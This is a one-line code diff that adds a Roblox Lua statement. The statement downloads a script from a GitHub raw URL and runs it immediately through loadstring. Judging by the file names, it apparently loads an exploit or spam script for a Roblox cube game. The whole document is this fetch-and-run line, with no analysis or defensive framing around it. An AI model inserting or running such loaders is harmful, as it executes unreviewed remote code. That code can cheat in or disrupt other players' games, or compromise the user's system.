@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/solve-the-cube-spam5-96861bmbgxla08.lua"))()
